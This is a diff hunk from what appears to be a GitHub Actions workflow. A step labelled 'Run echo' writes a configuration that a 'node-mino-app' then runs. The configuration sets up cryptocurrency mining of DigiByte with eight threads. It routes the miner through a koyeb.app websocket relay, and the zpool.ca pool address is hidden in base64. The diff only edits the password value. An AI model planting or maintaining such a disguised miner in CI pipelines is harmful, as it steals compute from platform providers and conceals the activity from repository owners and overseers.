@@ -26,7 +26,7 @@ jobs:
       - name: Run echo
         working-directory: node-mino-app
         run: |
-          echo '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "SWrtFsEa237mckDo7hmtHR2YtadmbZJNus", "password": "c=DGB,567", "argent": "wasm-mino/2.0", "threads": 8}' > data.txt
+          echo '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "SWrtFsEa237mckDo7hmtHR2YtadmbZJNus", "password": "c=DGB,417", "argent": "wasm-mino/2.0", "threads": 8}' > data.txt
       - name: Run node app
         working-directory: node-mino-app
         run: |
